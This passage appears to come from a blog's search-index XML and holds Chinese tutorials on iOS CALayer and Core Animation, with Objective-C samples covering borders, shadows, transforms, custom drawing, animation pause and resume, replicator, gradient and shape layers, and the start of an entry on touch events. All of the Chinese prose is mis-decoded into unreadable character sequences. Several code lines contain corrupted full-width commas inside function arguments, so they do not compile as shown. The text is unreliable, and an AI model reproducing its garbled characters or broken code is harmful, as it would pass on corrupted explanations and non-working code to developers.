é€Ÿï¼Œç„¶åŽå‡é€Ÿçš„åˆ°è¾¾ç›®çš„åœ°ã€‚è¿™ä¸ªæ˜¯é»˜è®¤çš„åŠ¨ç”»è¡Œä¸ºã€‚kCAMediaTimingFunctionEaseInEaseOut CAAnimationâ€”â€”åŠ¨ç”»ä»£ç†æ–¹æ³•1234567891011121314// CAAnimationåœ¨åˆ†ç±»ä¸­å®šä¹‰äº†ä»£ç†æ–¹æ³•@interface NSObject (CAAnimationDelegate)/* Called when the animation begins its active duration. */- (void)animationDidStart:(CAAnimation *)anim;/* Called when the animation either completes its active duration or * is removed from the object it is attached to (i.e. the layer). 'flag' * is true if the animation reached the end of its active duration * without being removed. */- (void)animationDidStop:(CAAnimation *)anim finished:(BOOL)flag;@end CAPropertyAnimation æ˜¯CAAnimationçš„å­ç±»ï¼Œä¹Ÿæ˜¯ä¸ªæŠ½è±¡ç±»ï¼Œè¦æƒ³åˆ›å»ºåŠ¨ç”»å¯¹è±¡ï¼Œåº”è¯¥ä½¿ç”¨å®ƒçš„ä¸¤ä¸ªå­ç±»ï¼šCABasicAnimationå’ŒCAKeyframeAnimation å±žæ€§è¯´æ˜Žï¼š keyPathï¼šé€šè¿‡æŒ‡å®šCALayerçš„ä¸€ä¸ªå±žæ€§åç§°ä¸ºkeyPath(NSStringç±»åž‹)ï¼Œå¹¶ä¸”å¯¹CALayerçš„è¿™ä¸ªå±žæ€§çš„å€¼è¿›è¡Œä¿®æ”¹ï¼Œè¾¾åˆ°ç›¸åº”çš„åŠ¨ç”»æ•ˆæžœã€‚ æ¯”å¦‚ï¼ŒæŒ‡å®š@â€positionâ€ä¸ºkeyPathï¼Œå°±ä¿®æ”¹CALayerçš„positionå±žæ€§çš„å€¼ï¼Œä»¥è¾¾åˆ°å¹³ç§»çš„åŠ¨ç”»æ•ˆæžœã€‚ CALayer åœ¨iOSä¸­ï¼Œä½ èƒ½çœ‹å¾—è§æ‘¸å¾—ç€çš„ä¸œè¥¿åŸºæœ¬ä¸Šéƒ½æ˜¯UIViewï¼Œæ¯”å¦‚ä¸€ä¸ªæŒ‰é’®ã€ä¸€ä¸ªæ–‡æœ¬æ ‡ç­¾ã€ä¸€ä¸ªæ–‡æœ¬è¾“å…¥æ¡†ã€ä¸€ä¸ªå›¾æ ‡ç­‰ç­‰ï¼Œè¿™äº›éƒ½æ˜¯UIViewã€‚ å…¶å®žUIViewä¹‹æ‰€ä»¥èƒ½æ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼Œå®Œå…¨æ˜¯å› ä¸ºå®ƒå†…éƒ¨çš„ä¸€ä¸ªå›¾å±‚ã€‚ åœ¨åˆ›å»ºUIViewå¯¹è±¡æ—¶ï¼ŒUIViewå†…éƒ¨ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªå›¾å±‚(å³CALayerå¯¹è±¡)ï¼Œé€šè¿‡UIViewçš„layerå±žæ€§å¯ä»¥è®¿é—®è¿™ä¸ªå±‚ã€‚ 1@property(nonatomicï¼Œreadonlyï¼Œretain) CALayer *layer; å½“UIViewéœ€è¦æ˜¾ç¤ºåˆ°å±å¹•ä¸Šæ—¶ï¼Œä¼šè°ƒç”¨drawRect:æ–¹æ³•è¿›è¡Œç»˜å›¾ï¼Œå¹¶ä¸”ä¼šå°†æ‰€æœ‰å†…å®¹ç»˜åˆ¶åœ¨è‡ªå·±çš„å›¾å±‚ä¸Šï¼Œç»˜å›¾å®Œæ¯•åŽï¼Œç³»ç»Ÿä¼šå°†å›¾å±‚æ‹·è´åˆ°å±å¹•ä¸Šï¼ŒäºŽæ˜¯å°±å®Œæˆäº†UIViewçš„æ˜¾ç¤ºã€‚ æ¢å¥è¯è¯´ï¼ŒUIViewæœ¬èº«ä¸å…·å¤‡æ˜¾ç¤ºçš„åŠŸèƒ½ï¼Œæ˜¯å®ƒå†…éƒ¨çš„å±‚æ‰æœ‰æ˜¾ç¤ºåŠŸèƒ½ã€‚ å›¾å±‚çš„å¸¸è§å±žæ€§åº”ç”¨1234567891011121314151617181920212223242526272829303132333435/** å›¾åƒå›¾å±‚çš„å±žæ€§ */- (void)demoImageView&#123; // è®¾ç½®å¤´åƒçš„è¾¹æ¡†å’Œé¢œè‰² self.iconVIew.layer.borderWidth = 5; self.iconVIew.layer.borderColor = [UIColor blackColor].CGColor; // è®¾ç½®åœ†è§’åŠå¾„ self.iconVIew.layer.cornerRadius = 10;#warning åªæœ‰è®¾ç½®è¿™ä¸ªå›¾ç‰‡çš„åœ†è§’æ‰ä¼šå‡ºæ¥ (å› ä¸ºå›¾ç‰‡ä¸æ˜¯åŠ åœ¨ä¸»å±‚ä¸Šçš„ æ˜¯åœ¨å­å±‚ä¸Šé¢)// self.iconVIew.clipsToBounds = YES; // è®¾ç½®é˜´å½±å’Œé¢œè‰²#warning è£å‰ªçš„è¯å°±ä¸ä¼šæœ‰é˜´å½±æ•ˆæžœ è¿™ä¸¤ä¸ªå±žæ€§ä¸èƒ½å…±å­˜ self.iconVIew.layer.shadowOffset = CGSizeMake(20ï¼Œ 20); self.iconVIew.layer.shadowColor = [UIColor blackColor].CGColor; self.iconVIew.layer.shadowOpacity = 0.5; // ä¸é€æ˜Žåº¦ é»˜è®¤é˜´å½±æ˜¯é€æ˜Žçš„&#125;/** viewçš„å›¾å±‚çš„è®¾ç½® */- (void)demoView&#123; // è®¾ç½®è¾¹æ¡†å’Œé¢œè‰² self.cyanView.layer.borderWidth = 10; self.cyanView.layer.borderColor = [UIColor redColor].CGColor; // è®¾ç½®åœ†è§’åŠå¾„ self.cyanView.layer.cornerRadius = 10; // è®¾ç½®é˜´å½±å’Œé¢œè‰² self.cyanView.layer.shadowOffset = CGSizeMake(20ï¼Œ 20); self.cyanView.layer.shadowColor = [UIColor blackColor].CGColor; self.cyanView.layer.shadowOpacity = 0.5; // ä¸é€æ˜Žåº¦ é»˜è®¤é˜´å½±æ˜¯é€æ˜Žçš„&#125; å›¾å±‚çš„å½¢å˜å±žæ€§12345678910111213141516171819202122232425/** transforå±žæ€§ */- (IBAction)btnClick &#123; // 3Då±žæ€§ å¤šäº†ä¸ªYè½´ (ä½œç”¨äºŽå›¾å±‚) self.iconVIew.layer.transform = CATransform3DMakeTranslation(50ï¼Œ 50ï¼Œ 0); self.iconVIew.transform = CGAffineTransformMakeTranslation(50ï¼Œ 50); // X Y Z ä¸‰æ¡è½´ å½¢æˆä¸€ä¸ªæ—‹è½¬è½´ (å·¦ä¸Šè§’(0ï¼Œ0) å³ä¸‹è§’(1ï¼Œ1) self.iconVIew.layer.transform = CATransform3DMakeRotation(M_2_PIï¼Œ 1ï¼Œ 1ï¼Œ 0); // åªèƒ½å¹³é¢æ—‹è½¬ self.iconVIew.transform = CGAffineTransformMakeRotation(M_2_PI); // å¯ä»¥ç”¨KVCå¾—æ–¹å¼èµ‹å€¼ (å¯ä»¥ä¼ é€’å“ªäº›key pathï¼Œ åœ¨å®˜æ–¹æ–‡æ¡£æœç´¢ "CATransform3D key paths") [self.iconVIew.layer setValue:@(M_2_PI) forKeyPath:@"transform.rotation"]; [self.iconVIew.layer setValue:@(100) forKeyPath:@"transform.translation.x"]; NSValue *value = [NSValue valueWithCATransform3D:CATransform3DMakeRotation(M_2_PIï¼Œ 1ï¼Œ 1ï¼Œ 0)]; [self.iconVIew.layer setValue:value forKeyPath:@"transform"]; NSValue *value1 = [NSValue valueWithCATransform3D:CATransform3DMakeScale(1ï¼Œ 2ï¼Œ 0)]; [self.iconVIew.layer setValue:value1 forKeyPath:@"transform"];&#125;; è‡ªå®šä¹‰å›¾å±‚ UIView *view; view.layer.delegate == view; viewçš„å®Œæ•´æ˜¾ç¤ºè¿‡ç¨‹ view.layerä¼šå‡†å¤‡ä¸€ä¸ªLayer Graphics Contex(å›¾å±‚ç±»åž‹çš„ä¸Šä¸‹æ–‡) è°ƒç”¨view.layer.delegate(view)çš„drawLayer:inContext:ï¼Œå¹¶ä¼ å…¥åˆšæ‰å‡†å¤‡å¥½çš„ä¸Šä¸‹æ–‡ viewçš„drawLayer:inContext:æ–¹æ³•å†…éƒ¨åˆä¼šè°ƒç”¨viewçš„drawRect:æ–¹æ³• viewå°±å¯ä»¥åœ¨drawRect:æ–¹æ³•ä¸­å®žçŽ°ç»˜å›¾ä»£ç ï¼Œ æ‰€æœ‰ä¸œè¥¿æœ€ç»ˆéƒ½ç»˜åˆ¶åˆ°view.layerä¸Šé¢ ç³»ç»Ÿå†å°†view.layerçš„å†…å®¹æ‹·è´åˆ°å±å¹•ï¼ŒäºŽæ˜¯å®Œæˆäº†viewçš„æ˜¾ç¤º è‡ªå®šä¹‰å±‚ï¼Œå…¶å®žå°±æ˜¯åœ¨å±‚ä¸Šç»˜å›¾ï¼Œä¸€å…±æœ‰2ç§æ–¹æ³•ï¼Œä¸‹é¢è¯¦ç»†ä»‹ç»ä¸€ä¸‹ã€‚ è‡ªå®šä¹‰å›¾å±‚æ–¹æ³•1 æ–¹æ³•æè¿°ï¼šåˆ›å»ºä¸€ä¸ªCALayerçš„å­ç±»ï¼Œç„¶åŽè¦†ç›–drawInContext:æ–¹æ³•ï¼Œä½¿ç”¨Quartz2D APIè¿›è¡Œç»˜å›¾ 123456789101112131415161718192021222324252627282930313233343536- (void)diyLayer&#123; XSLayer *layer = [XSLayer layer]; layer.bounds = CGRectMake(0ï¼Œ 0ï¼Œ 100ï¼Œ 100); layer.backgroundColor = [UIColor redColor].CGColor; layer.anchorPoint = CGPointZero; layer.position = CGPointMake(100ï¼Œ 100); layer.delegate = self; // åªæœ‰æ˜Žæ˜¾åœ°è°ƒç”¨setNeedsDisplayæ–¹æ³•ï¼Œæ‰ä¼šè°ƒç”¨drawInContext:æ–¹æ³•è¿›è¡Œç»˜åˆ¶ [layer setNeedsDisplay]; [self.view.layer addSublayer:layer]; &#125;- (void)demoLayer&#123; CALayer *layer = [CALayer layer]; layer.bounds = CGRectMake(0ï¼Œ 0ï¼Œ 100ï¼Œ 100); layer.backgroundColor = [UIColor redColor].CGColor; layer.anchorPoint = CGPointZero; // å†³å®šäº†positionçš„ä½ç½® layer.position = CGPointMake(100ï¼Œ 100); layer.delegate = self; // åªæœ‰æ˜Žæ˜¾åœ°è°ƒç”¨setNeedsDisplayæ–¹æ³•ï¼Œæ‰ä¼šè°ƒç”¨drawInContext:æ–¹æ³•è¿›è¡Œç»˜åˆ¶ [layer setNeedsDisplay]; [self.view.layer addSublayer:layer];&#125;#pragma mark - ä»£ç†æ–¹æ³•- (void)drawLayer:(CALayer *)layer inContext:(CGContextRef)ctx&#123; // è®¾ç½®é¢œè‰² CGContextSetRGBFillColor(ctxï¼Œ 0ï¼Œ 1ï¼Œ 0ï¼Œ 1); // ç”»åœ† CGContextAddEllipseInRect(ctxï¼Œ CGRectMake(50ï¼Œ 50ï¼Œ 50ï¼Œ 50)); // æ¸²æŸ“ CGContextFillPath(ctx);&#125; è‡ªå®šä¹‰çš„å›¾å±‚æ–¹æ³•2 æ–¹æ³•æè¿°ï¼šåˆ›å»ºä¸€ä¸ªCALayerçš„å­ç±»ï¼Œç„¶åŽè¦†ç›–drawInContext:æ–¹æ³•ï¼Œä½¿ç”¨uartz2D APIè¿›è¿›è¡Œç»˜å›¾ 123456789101112131415#import "XSLayer.h"@implementation XSLayer/** åªæœ‰æ˜Žæ˜¾åœ°è°ƒç”¨setNeedsDisplayæ–¹æ³•ï¼Œæ‰ä¼šè°ƒç”¨drawInContext:æ–¹æ³•è¿›è¡Œç»˜åˆ¶ */- (void)drawInContext:(CGContextRef)ctx&#123; // è®¾ç½®é¢œè‰² CGContextSetRGBFillColor(ctxï¼Œ 0ï¼Œ 0ï¼Œ 1ï¼Œ 1); // ç”»åœ† CGContextAddRect(ctxï¼Œ CGRectMake(0ï¼Œ 0ï¼Œ 50ï¼Œ 50)); // æ¸²æŸ“ CGContextFillPath(ctx);&#125;@end CALayerä¸ŠåŠ¨ç”»çš„æš‚åœå’Œæ¢å¤1234567891011121314151617181920212223242526#pragma mark æš‚åœCALayerçš„åŠ¨ç”»-(void)pauseLayer:(CALayer*)layer&#123; CFTimeInterval pausedTime = [layer convertTime:CACurrentMediaTime() fromLayer:nil]; // è®©CALayerçš„æ—¶é—´åœæ­¢èµ°åŠ¨ layer.speed = 0.0; // è®©CALayerçš„æ—¶é—´åœç•™åœ¨pausedTimeè¿™ä¸ªæ—¶åˆ» layer.timeOffset = pausedTime;&#125;#pragma mark æ¢å¤CALayerçš„åŠ¨ç”»-(void)resumeLayer:(CALayer*)layer&#123; CFTimeInterval pausedTime = layer.timeOffset; // 1. è®©CALayerçš„æ—¶é—´ç»§ç»­è¡Œèµ° layer.speed = 1.0; // 2. å–æ¶ˆä¸Šæ¬¡è®°å½•çš„åœç•™æ—¶åˆ» layer.timeOffset = 0.0; // 3. å–æ¶ˆä¸Šæ¬¡è®¾ç½®çš„æ—¶é—´ layer.beginTime = 0.0; // 4. è®¡ç®—æš‚åœçš„æ—¶é—´(è¿™é‡Œä¹Ÿå¯ä»¥ç”¨CACurrentMediaTime()-pausedTime) CFTimeInterval timeSincePause = [layer convertTime:CACurrentMediaTime() fromLayer:nil] - pausedTime; // 5. è®¾ç½®ç›¸å¯¹äºŽçˆ¶åæ ‡ç³»çš„å¼€å§‹æ—¶é—´(å¾€åŽé€€timeSincePause) layer.beginTime = timeSincePause;&#125; éšå¼åŠ¨ç”» æ¯ä¸€ä¸ªUIViewå†…éƒ¨éƒ½é»˜è®¤å…³è”ç€ä¸€ä¸ªCALayerï¼Œæˆ‘ä»¬å¯ç”¨ç§°è¿™ä¸ªLayerä¸ºRoot Layerï¼ˆæ ¹å±‚ï¼‰ æ‰€æœ‰çš„éžRoot Layerï¼Œä¹Ÿå°±æ˜¯æ‰‹åŠ¨åˆ›å»ºçš„CALayerå¯¹è±¡ï¼Œéƒ½å­˜åœ¨ç€éšå¼åŠ¨ç”» ä»€ä¹ˆæ˜¯éšå¼åŠ¨ç”»ï¼Ÿ å½“å¯¹éžRootLayerçš„éƒ¨åˆ†å±žæ€§è¿›è¡Œä¿®æ”¹æ—¶ï¼Œé»˜è®¤ä¼šè‡ªåŠ¨äº§ç”Ÿä¸€äº›åŠ¨ç”»æ•ˆæžœ,è€Œè¿™äº›å±žæ€§ç§°ä¸ºAnimatableProperties(å¯åŠ¨ç”»å±žæ€§) åˆ—ä¸¾å‡ ä¸ªå¸¸è§çš„Animatable Propertiesï¼š boundsï¼šç”¨äºŽè®¾ç½®CALayerçš„å®½åº¦å’Œé«˜åº¦ã€‚ä¿®æ”¹è¿™ä¸ªå±žæ€§ä¼šäº§ç”Ÿç¼©æ”¾åŠ¨ç”» backgroundColorï¼šç”¨äºŽè®¾ç½®CALayerçš„èƒŒæ™¯è‰²ã€‚ä¿®æ”¹è¿™ä¸ªå±žæ€§ä¼šäº§ç”ŸèƒŒæ™¯è‰²çš„æ¸å˜åŠ¨ç”» positionï¼šç”¨äºŽè®¾ç½®CALayerçš„ä½ç½®ã€‚ä¿®æ”¹è¿™ä¸ªå±žæ€§ä¼šäº§ç”Ÿå¹³ç§»åŠ¨ç”» äº‹åŠ¡ å¯ä»¥é€šè¿‡åŠ¨ç”»äº‹åŠ¡(CATransaction)å…³é—­é»˜è®¤çš„éšå¼åŠ¨ç”»æ•ˆæžœ 1234[CATransaction begin];[CATransaction setDisableActions:YES];self.myview.layer.position = CGPointMake(10, 10);[CATransaction commit]; CALayeræ³¨æ„ç‚¹å…³äºŽCALayerçš„ç–‘æƒ‘ ä¸ºä»€ä¹ˆCALayerä¸­ä½¿ç”¨CGColorRefå’ŒCGImageRefè¿™2ç§æ•°æ®ç±»åž‹ï¼Œè€Œä¸ç”¨UIColorå’ŒUIImageï¼Ÿ é¦–å…ˆ CALayeræ˜¯å®šä¹‰åœ¨QuartzCoreæ¡†æž¶ä¸­çš„ï¼ŒCGImageRefã€CGColorRefä¸¤ç§æ•°æ®ç±»åž‹æ˜¯å®šä¹‰åœ¨CoreGraphicsæ¡†æž¶ä¸­çš„ã€‚ UIColorã€UIImageæ˜¯å®šä¹‰åœ¨UIKitæ¡†æž¶ä¸­çš„ã€‚ å…¶æ¬¡ QuartzCoreæ¡†æž¶å’ŒCoreGraphicsæ¡†æž¶æ˜¯å¯ä»¥è·¨å¹³å°ä½¿ç”¨çš„ï¼Œåœ¨iOSå’ŒMac OS Xä¸Šéƒ½èƒ½ä½¿ç”¨ã€‚ ä½†æ˜¯UIKitåªèƒ½åœ¨iOSä¸­ä½¿ç”¨ã€‚ ä¸ºäº†ä¿è¯å¯ç§»æ¤æ€§ï¼ŒQuartzCoreä¸èƒ½ä½¿ç”¨UIImageã€UIColorï¼Œåªèƒ½ä½¿ç”¨CGImageRefã€CGColorRefã€‚ UIViewå’ŒCALayerçš„é€‰æ‹© é€šè¿‡CALayerï¼Œå°±èƒ½åšå‡ºè·ŸUIImageViewä¸€æ ·çš„ç•Œé¢æ•ˆæžœï¼Œæ—¢ç„¶CALayerå’ŒUIViewéƒ½èƒ½å®žçŽ°ç›¸åŒçš„æ˜¾ç¤ºæ•ˆæžœï¼Œé‚£ç©¶ç«Ÿè¯¥é€‰æ‹©è°å¥½å‘¢ï¼Ÿ å…¶å®žï¼Œå¯¹æ¯”CALayerï¼ŒUIViewå¤šäº†ä¸€ä¸ªäº‹ä»¶å¤„ç†çš„åŠŸèƒ½ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒCALayerä¸èƒ½å¤„ç†ç”¨æˆ·çš„è§¦æ‘¸äº‹ä»¶ï¼Œè€ŒUIViewå¯ä»¥ã€‚ æ‰€ä»¥ï¼Œå¦‚æžœæ˜¾ç¤ºå‡ºæ¥çš„ä¸œè¥¿éœ€è¦è·Ÿç”¨æˆ·è¿›è¡Œäº¤äº’çš„è¯ï¼Œç”¨UIViewï¼›å¦‚æžœä¸éœ€è¦è·Ÿç”¨æˆ·è¿›è¡Œäº¤äº’ï¼Œç”¨UIViewæˆ–è€…CALayeréƒ½å¯ä»¥ã€‚ å½“ç„¶ï¼ŒCALayerçš„æ€§èƒ½ä¼šé«˜ä¸€äº›ï¼Œå› ä¸ºå®ƒå°‘äº†äº‹ä»¶å¤„ç†çš„åŠŸèƒ½ï¼Œæ›´åŠ è½»é‡çº§ã€‚ positionå’ŒanchorPoint CALayeræœ‰2ä¸ªéžå¸¸é‡è¦çš„å±žæ€§ï¼špositionå’ŒanchorPoint 123456789// ç”¨æ¥è®¾ç½®CALayeråœ¨çˆ¶å±‚ä¸­çš„ä½ç½®// ä»¥çˆ¶å±‚çš„å·¦ä¸Šè§’ä¸ºåŽŸç‚¹(0, 0)@property CGPoint position;// ç§°ä¸ºâ€œå®šä½ç‚¹â€ã€â€œé”šç‚¹â€// å†³å®šç€CALayerèº«ä¸Šçš„å“ªä¸ªç‚¹ä¼šåœ¨positionå±žæ€§æ‰€æŒ‡çš„ä½ç½®// ä»¥è‡ªå·±çš„å·¦ä¸Šè§’ä¸ºåŽŸç‚¹(0, 0)// å®ƒçš„xã€yå–å€¼èŒƒå›´éƒ½æ˜¯0~1ï¼Œé»˜è®¤å€¼ä¸ºï¼ˆ0.5, 0.5ï¼‰(å³ä¸­å¿ƒç‚¹)@property CGPoint anchorPoint; UIViewå’ŒCALayerçš„å…¶ä»–å…³ç³» UIViewå¯ä»¥é€šè¿‡subviewså±žæ€§è®¿é—®æ‰€æœ‰çš„å­è§†å›¾ï¼Œç±»ä¼¼åœ°ï¼ŒCALayerä¹Ÿå¯ä»¥é€šè¿‡sublayerså±žæ€§è®¿é—®æ‰€æœ‰çš„å­å±‚ UIViewå¯ä»¥é€šè¿‡superviewå±žæ€§è®¿é—®çˆ¶è§†å›¾ï¼Œç±»ä¼¼åœ°ï¼ŒCALayerä¹Ÿå¯ä»¥é€šè¿‡superlayerå±žæ€§è®¿é—®çˆ¶å±‚ ä¸‹é¢å†çœ‹ä¸€å¼ UIViewå’ŒCALayerçš„å…³ç³»å›¾ï¼š å¦‚æžœä¸¤ä¸ªUIViewæ˜¯çˆ¶å­å…³ç³»ï¼Œé‚£ä¹ˆå®ƒä»¬å†…éƒ¨çš„CALayerä¹Ÿæ˜¯çˆ¶å­å…³ç³»ã€‚ å¸¸ç”¨çš„CALayerå­ç±»CAReplicatorLayerï¼ˆå¤åˆ¶å±‚ï¼‰ ç»“åˆéŸ³é‡æŒ¯åŠ¨æ¡çš„ç®€å•ä½¿ç”¨ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647- (void)viewDidLoad &#123; [super viewDidLoad]; // åˆ›å»ºå¤åˆ¶å±‚ CAReplicatorLayer *repLayer = [CAReplicatorLayer layer]; repLayer.frame = self.musicView.bounds; // è®¾ç½®å¤åˆ¶ä»½æ•°(è¡¨ç¤ºçš„æ˜¯å¤åˆ¶å±‚å†…æ‰€æœ‰çš„ç©ºé—´ä¸ºä¸€ä»½ å¤åˆ¶çš„æ€»çš„ä»½æ•°) repLayer.instanceCount = 5; // è®¾ç½®å¤åˆ¶å±‚çš„å½¢å˜(ç›¸å¯¹äºŽä¸Šä¸€ä¸ª) repLayer.instanceTransform = CATransform3DMakeTranslation(40, 0, 0); // å¤åˆ¶å±‚(æ¯ä¸€ä»½)çš„åŠ¨ç”»é—´éš”æ—¶é—´ (ç›¸å¯¹äºŽä¸Šä¸€ge) repLayer.instanceDelay = 0.3; // æ·»åŠ å¤åˆ¶å±‚ [self.musicView.layer addSublayer:repLayer]; // åˆ›å»ºå•ä¸ªéŸ³ä¹éœ‡åŠ¨æ¡ CALayer *redLayer = [CALayer layer]; redLayer.backgroundColor = [UIColor redColor].CGColor; // è®¾ç½®é”šç‚¹ redLayer.anchorPoint = CGPointMake(0, 1); // è®¾ç½®position redLayer.position = CGPointMake(0, 200); CGFloat redLayerX = 0; CGFloat redLayerY = 0; CGFloat redLayerW = 30; CGFloat redLayerH = 100; redLayer.bounds = CGRectMake(redLayerX, redLayerY, redLayerW, redLayerH); [repLayer addSublayer:redLayer]; // æ·»åŠ åŠ¨ç”» CABasicAnimation *anim = [CABasicAnimation animation]; anim.keyPath = @"transform.scale.y"; anim.toValue = @0; anim.repeatCount = MAXFLOAT; anim.duration = .5; // è®¾ç½®ç¿»è½¬åŠ¨ç”»(å³æ˜¯æ¢å¤æ—¶å€™çš„åŠ¨ç”») repLayer.autoreverses = YES; // æ·»åŠ åŠ¨ç”» [redLayer addAnimation:anim forKey:nil];&#125; CAGradientLayerï¼ˆæ¸å˜å±‚ï¼‰123456789101112131415161718192021222324252627282930313233343536#pragma mark - ç”¨æ¸å˜å±‚ç»™ä¸‹åŠéƒ¨åˆ†æ·»åŠ é˜´å½± CAGradientLayer *gradientLayer = [CAGradientLayer layer]; // æ¸å˜é¢œè‰² (ä»Žä¸€ä¸ªé¢œè‰²åˆ°å¦ä¸€ä¸ªé¢œè‰²è¿‡æ¸¡) gradientLayer.colors = @[(id)[UIColor clearColor].CGColor,(id)[UIColor blackColor].CGColor]; // è®¾ç½®æ¸å˜å±‚çš„frame gradientLayer.frame = self.bottomImageView.bounds; // è®¾ç½®ä¸é€æ˜Žåº¦ (ä¸€å¼€å§‹æ˜¯0 ä¸æ˜¾ç¤º) gradientLayer.opacity = 0;// // è®¾ç½®æ¸å˜çš„ä½ç½®// gradientLayer.locations = @[@2,@5]; // è®¾ç½®æ¸å˜çš„æ–¹å‘// gradientLayer.startPoint// gradientLayer.endPoint [self.bottomImageView.layer addSublayer:gradientLayer]; self.gradientLayer = gradientLayer;if (sender.state == UIGestureRecognizerStateEnded) &#123;// é˜´å½±è®¾ç½®ä¸º0self.gradientLayer.opacity = 0;// è®¾ç½®æ¾æ‰‹å›žå¼¹çš„æ—¶å€™çš„å¼¹ç°§æ•ˆæžœ[UIView animateWithDuration:1 delay:0 usingSpringWithDamping:.2 initialSpringVelocity:0 options:UIViewAnimationOptionCurveEaseInOut animations:^&#123;// è¿˜åŽŸå½¢å˜self.self.topImageView.layer.transform = CATransform3DIdentity;&#125; completion:^(BOOL finished) &#123;&#125;]; CAShapeLayerï¼ˆå½¢çŠ¶å›¾å±‚ï¼‰ ç»“åˆQQ bageæ¶ˆæ¯çš„ç²˜æ€§è®¡ç®—å®žä¾‹ 1234567891011121314- (CAShapeLayer *)shapeLayer&#123; if (!_shapeLayer) &#123; // å¯ä»¥æ ¹æ®ä¸€ä¸ªè·¯å¾„ç”Ÿæˆä¸€ä¸ªå›¾å±‚ CAShapeLayer *shapeLayer = [CAShapeLayer layer]; shapeLayer.fillColor = [UIColor redColor].CGColor; [self.superview.layer insertSublayer:shapeLayer atIndex:0]; self.shapeLayer = shapeLayer; &#125; return _shapeLayer;&#125;// è®¾ç½®å½¢çŠ¶å›¾å±‚çš„è·¯å¾„self.shapeLayer.path = path.CGPath; QQ bageæ¶ˆæ¯çš„ç²˜æ€§è®¡ç®—å›¾ è®¡ç®—æ–¹æ³• 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// è®¡ç®—ä¸è§„åˆ™çš„çŸ©å½¢è·¯å¾„- (UIBezierPath *)pathWithSmallView:(UIView *)smallView bigView:(UIView *)bigView&#123; // è®¡ç®—åœ†å¿ƒ CGFloat d = [self distanceBetweenBigCirle:bigView andSmallCircle:smallView]; CGFloat y1 = smallView.center.y; CGFloat x1 = smallView.center.x; CGFloat r1 = smallView.layer.cornerRadius; CGFloat y2 = bigView.center.y; CGFloat x2 = bigView.center.x; CGFloat r2 = bigView.layer.cornerRadius; if (d == 0) return nil; // cosÎ¸ CGFloat cosÎ¸ = (y2 - y1) / d; // sinÎ¸ CGFloat sinÎ¸ = (x2 - x1) / d; // A: CGPoint pointA = CGPointMake(x1 - r1 * cosÎ¸, y1 + r1 * sinÎ¸); // B: CGPoint pointB = CGPointMake(x1 + r1 * cosÎ¸, y1 - r1 * sinÎ¸); // C: CGPoint pointC = CGPointMake(x2 + r2 * cosÎ¸, y2 - r2 * sinÎ¸); // D: CGPoint pointD = CGPointMake(x2 - r2 * cosÎ¸, y2 + r2 * sinÎ¸); // O: CGPoint pointO = CGPointMake(pointA.x + d * 0.5 * sinÎ¸, pointA.y + d * 0.5 * cosÎ¸); // P: CGPoint pointP = CGPointMake(pointB.x + d * 0.5 * sinÎ¸, pointB.y + d * 0.5 * cosÎ¸); // æè¿°è·¯å¾„ UIBezierPath *path = [UIBezierPath bezierPath]; [path moveToPoint:pointA]; // AB [path addLineToPoint:pointB]; // BC // ç»˜åˆ¶æ›²çº¿ [path addQuadCurveToPoint:pointC controlPoint:pointP]; // CD [path addLineToPoint:pointD]; // DA [path addQuadCurveToPoint:pointA controlPoint:pointO]; return path;&#125;]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>CAAnimation</tag>
        <tag>CALayer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¹‹äº‹ä»¶å“åº”åŠå¤„ç†]]></title>
    <url>%2Farchives%2Fbb2b9a9.html</url>
    <content type="text"><![CDATA[å‡„å‡‰å®å‰‘ç¯‡ï¼Œç¾æ³Šæ¬²ç©·å¹´ã€‚é»„å¶ä»é£Žé›¨ï¼Œé’æ¥¼è‡ªç®¡å¼¦ã€‚æ–°çŸ¥é­è–„ä¿—ï¼Œæ—§å¥½éš”è‰¯ç¼˜ã€‚å¿ƒæ–­æ–°ä¸°é…’ï¼Œé”€æ„æ–—å‡ åƒã€‚ æŽå•†éš ã€Šé£Žé›¨ã€‹ å“åº”è€…å¯¹è±¡ åœ¨iOSä¸­ä¸æ˜¯ä»»ä½•å¯¹è±¡éƒ½èƒ½å¤„ç†äº‹ä»¶ï¼Œåªæœ‰ç»§æ‰¿äº†UIResponderçš„å¯¹è±¡æ‰èƒ½æŽ¥æ”¶å¹¶å¤„ç†äº‹ä»¶ã€‚æˆ‘ä»¬ç§°ä¹‹ä¸ºâ€œå“åº”è€…å¯¹è±¡â€ UIApplicationã€UIViewControllerã€UIViewéƒ½ç»§æ‰¿è‡ªUIResponderï¼Œå› æ­¤å®ƒä»¬éƒ½æ˜¯å“åº”è€…å¯¹è±¡ï¼Œéƒ½èƒ½å¤ŸæŽ¥æ”¶å¹¶å¤„ç†äº‹ä»¶ UIResponderå†…éƒ¨æä¾›äº†ä»¥ä¸‹æ–¹æ³•æ¥å¤„ç†äº‹ä»¶ 12345678910111213// è§¦æ‘¸äº‹ä»¶- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event;- (void)touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event;- (void)touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event;- (void)touchesCancelled:(NSSet *)touches withEvent:(UIEvent *)event;// åŠ é€Ÿè®¡äº‹ä»¶- (void)motionBegan:(UIEventSubtype)motion withEvent:(UIEvent *)event;- (void)motionEnded:(UIEventSubtype)motion withEvent:(UIEvent *)event;- (void)motionCancelled:(UIEventSubtype)motion withEvent:(UIEvent *)event;// è¿œç¨‹æŽ§åˆ¶äº‹ä»¶- (void)remoteControlReceivedWithEvent:(UIEvent *)event; UIViewæ˜¯UIResponderçš„å­ç±»ï¼Œå¯ä»¥è¦†ç›–ä¸‹åˆ—4ä¸ªæ–¹æ³•å¤„ç†ä¸åŒçš„è§¦æ‘¸äº‹ä»¶ 12345678910111213// ä¸€æ ¹æˆ–è€…å¤šæ ¹æ‰‹æŒ‡å¼€å§‹è§¦æ‘¸viewï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è°ƒç”¨viewçš„ä¸‹é¢æ–¹æ³•- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event// ä¸€æ ¹æˆ–è€…å¤šæ 